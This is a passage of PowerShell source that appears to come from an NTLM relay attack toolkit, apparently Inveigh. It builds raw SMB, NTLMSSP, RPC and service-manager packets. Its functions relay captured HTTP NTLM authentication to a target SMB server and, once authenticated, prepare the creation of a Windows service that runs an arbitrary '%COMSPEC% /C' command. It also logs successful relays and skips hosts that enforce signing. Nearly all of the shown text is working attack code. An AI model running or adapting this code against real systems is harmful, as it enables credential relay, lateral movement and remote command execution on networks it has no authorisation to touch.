            $packet_RPCBind.Add("Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("InterfaceVer3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("AuthLevel",[Byte[]](0x04))
            $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        if($packet_call_ID -eq 3)
        {
            $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("AuthLevel",[Byte[]](0x02))
            $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        return $packet_RPCBind
    }

    function New-PacketRPCRequest
    {
        param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

        if($packet_auth_length -gt 0)
        {
            $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
        }

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
        [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
        $packet_auth_length = $packet_auth_length[0,1]

        $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCRequest.Add("Version",[Byte[]](0x05))
        $packet_RPCRequest.Add("VersionMinor",[Byte[]](0x00))
        $packet_RPCRequest.Add("PacketType",[Byte[]](0x00))
        $packet_RPCRequest.Add("PacketFlags",$packet_flags)
        $packet_RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCRequest.Add("FragLength",$packet_frag_length)
        $packet_RPCRequest.Add("AuthLength",$packet_auth_length)
        $packet_RPCRequest.Add("CallID",$packet_call_ID)
        $packet_RPCRequest.Add("AllocHint",$packet_alloc_hint)
        $packet_RPCRequest.Add("ContextID",$packet_context_ID)
        $packet_RPCRequest.Add("Opnum",$packet_opnum)

        if($packet_data.Length)
        {
            $packet_RPCRequest.Add("Data",$packet_data)
        }

        return $packet_RPCRequest
    }

    #SCM

    function New-PacketSCMOpenSCManagerW
    {
        param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
        $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID1 += 0x00,0x00
        $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID2 += 0x00,0x00

        $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMOpenSCManagerW.Add("MachineName_ReferentID",$packet_referent_ID1)
        $packet_SCMOpenSCManagerW.Add("MachineName_MaxCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("MachineName_ActualCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("MachineName",$packet_service)
        $packet_SCMOpenSCManagerW.Add("Database_ReferentID",$packet_referent_ID2)
        $packet_SCMOpenSCManagerW.Add("Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("Unknown",[Byte[]](0xbf,0xbf))
        $packet_SCMOpenSCManagerW.Add("AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
        return $packet_SCMOpenSCManagerW
    }

    function New-PacketSCMCreateServiceW
    {
        param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
                [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
        $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID += 0x00,0x00

        $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMCreateServiceW.Add("ContextHandle",$packet_context_handle)
        $packet_SCMCreateServiceW.Add("ServiceName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("ServiceName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("ServiceName",$packet_service)
        $packet_SCMCreateServiceW.Add("DisplayName_ReferentID",$packet_referent_ID)
        $packet_SCMCreateServiceW.Add("DisplayName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("DisplayName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("DisplayName",$packet_service)
        $packet_SCMCreateServiceW.Add("AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
        $packet_SCMCreateServiceW.Add("ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("BinaryPathName_MaxCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("BinaryPathName_ActualCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("BinaryPathName",$packet_command)
        $packet_SCMCreateServiceW.Add("NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("TagID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("DependSize",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SCMCreateServiceW
    }

    function New-PacketSCMStartServiceW
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMStartServiceW.Add("ContextHandle",$packet_context_handle)
        $packet_SCMStartServiceW.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SCMStartServiceW
    }

    function New-PacketSCMDeleteServiceW
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMDeleteServiceW.Add("ContextHandle",$packet_context_handle)

        return $packet_SCMDeleteServiceW
    }

    function New-PacketSCMCloseServiceHandle
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCM_CloseServiceW.Add("ContextHandle",$packet_context_handle)

        return $packet_SCM_CloseServiceW
    }

}

# Relay Functions ScriptBlock
$SMB_relay_functions_scriptblock =
{

    function SMBNTLMChallenge
    {
        param ([Byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")

        if($payload.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
        }

        return $NTLM_challenge
    }

    function SMBRelayChallenge
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version,$SMB_process_ID)

        if($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_client_receive = New-Object System.Byte[] 1024
        $SMB_client_stage = 'NegotiateSMB'
        
        :SMB_relay_challenge_loop while($SMB_client_stage -ne 'exit')
        {
        
            switch ($SMB_client_stage)
            {

                'NegotiateSMB'
                {
                    $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $SMB_process_ID 0x00,0x00       
                    $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_relay_challenge_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_relay_challenge_stream.Flush()    
                    $SMB_relay_challenge_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                    {

                        if($Attack -eq 'Session')
                        {
                            $inveigh.target_list.Remove($SMB_relay_socket.Client.RemoteEndpoint.Address.IPaddressToString)
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed target $($SMB_relay_socket.Client.RemoteEndpoint.Address.IPaddressToString) due to SMB1 requirement")
                            $SMB_relay_socket.Close()
                            $SMB_client_stage = 'exit'
                        }
                        else
                        {
                            $SMB_version = 'SMB1'
                            $SMB_client_stage = 'NTLMSSPNegotiate'
                        }
                        
                    }
                    else
                    {
                        $SMB_client_stage = 'NegotiateSMB2'
                    }

                    if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03'))
                    {        
                        $inveigh.target_list.Remove($SMB_relay_socket.Client.RemoteEndpoint.Address.IPaddressToString)
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed target $($SMB_relay_socket.Client.RemoteEndpoint.Address.IPaddressToString) due to signing requirement")
                        $SMB_relay_socket.Close()
                        $SMB_client_receive = $null # ?
                        $SMB_client_stage = 'exit'
                    }
                    elseif($signing_check)
                    {
                        $SMB_relay_socket.Close()
                        $SMB_client_stage = 'exit'
                    }

                }
                
                'NegotiateSMB2'
                { 
                    $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                    $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                    $SMB2_message_ID = 1
                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID  
                    $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_relay_challenge_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_relay_challenge_stream.Flush()    
                    $SMB_relay_challenge_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'NTLMSSPNegotiate'
                }

                'NTLMSSPNegotiate'
                { 
                    
                    if($SMB_version -eq 'SMB1')
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x01,0x48 0xff,0xff $SMB_process_ID 0x00,0x00
                        $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 $HTTP_request_bytes[($HTTP_request_bytes.Length-8)..($HTTP_request_bytes.Length)]
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                        $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    }
                    else
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 $HTTP_request_bytes[($HTTP_request_bytes.Length-8)..($HTTP_request_bytes.Length)]
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                        $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    }

                    $SMB_relay_challenge_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_relay_challenge_stream.Flush()    
                    $SMB_relay_challenge_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB_client_stage = 'exit'
                }
            
            }

        }

        return $SMB_client_receive
    }

    function SMBRelayResponse
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version,$SMB_user_ID,$SMB_session_ID,$SMB_process_ID)
    
        $SMB_client_receive = New-Object System.Byte[] 1024

        if($SMB_relay_socket)
        {
            $SMB_relay_response_stream = $SMB_relay_socket.GetStream()
        }

        if($SMB_version -eq 'SMB1')
        {
            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x01,0x48 0xff,0xff $SMB_process_ID $SMB_user_ID
            $packet_SMB_header["UserID"] = $SMB_user_ID
            $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $HTTP_request_bytes
            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
            $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth      
            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_auth
            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
            $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
        }
        else
        {
            $SMB2_message_ID = 3
            $SMB2_tree_ID = 0x00,0x00,0x00,0x00
            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
            $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $HTTP_request_bytes
            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
            $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
        }

        $SMB_relay_response_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
        $SMB_relay_response_stream.Flush()
        $SMB_relay_response_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

        if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[9..12]) -eq '00-00-00-00') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00'))
        {
            $SMB_relay_failed = $false
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication successful for $HTTP_username_full on $Target") > $null              
        }
        else
        {

            if($HTTP_NTLM_domain_string -ne '')
            {
                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target") > $null
            }

            $inveigh.relay_list.Add("$HTTP_source_IP $Target") > $null
            $SMB_relay_failed = $true
            $SMB_relay_socket.Close()
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication failed for $HTTP_username_full on $Target") > $null
        }

        return $SMB_relay_failed
    }

    function SMBRelayExecute
    {
        param ($SMB_relay_socket,$SMB_version,$SMB_user_ID,$SMB_session_ID,$SMB_process_ID)

        $SMB_client_receive = New-Object System.Byte[] 1024

        if(!$Service)
        {
            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
            $SMB_service = $SMB_service_random -replace "-00",""
            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
            $SMB_service_random += '00-00-00-00-00'
            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}   
        }
        else
        {
            $SMB_service = $Service
            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($Service)

            if([Bool]($SMB_service.Length % 2))
            {
                $SMB_service_bytes += 0x00,0x00
            }
            else
            {
                $SMB_service_bytes += 0x00,0x00,0x00,0x00
            
            }

        }

        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)
        $Command = "%COMSPEC% /C `"" + $Command + "`""
        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $SMBExec_command += '00-00'
        }
        else
        {
            $SMBExec_command += '00-00-00-00'
        }    
    
        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)

        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }

        $SMB_named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03
        $SMB_client_stream = $SMB_relay_socket.GetStream()
        $SMB_split_index = 4256

        if($SMB_version -eq 'SMB1')
        {
            $SMB_client_stage = 'TreeConnectAndXRequest'

            :SMB_execute_loop while ($SMB_client_stage -ne 'Exit')
            {
        
                switch ($SMB_client_stage)
                {
        
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $SMB_process_ID $SMB_user_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'CreateAndXRequest'
                    }
                
                    'CreateAndXRequest'
                    {
                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                        $SMB_tree_ID = $SMB_client_receive[28,29]
                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'RPCBind'
                    }
            
                    'RPCBind'
                    {
                        $SMB_FID = $SMB_client_receive[42,43]
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_RPC_data = New-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'OpenSCManagerW'
                    }
            
                    'ReadAndXRequest'
                    {
                        Start-Sleep -m 150
                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBReadAndXRequest
                        $packet_SMB_data["FID"] = $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = $SMB_client_stage_next
                    }
            
                    'OpenSCManagerW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'CheckAccess'           
                    }

                    'CheckAccess'
                    {
                        
                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            $SMB_service_manager_context_handle = $SMB_client_receive[88..107]
                            $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

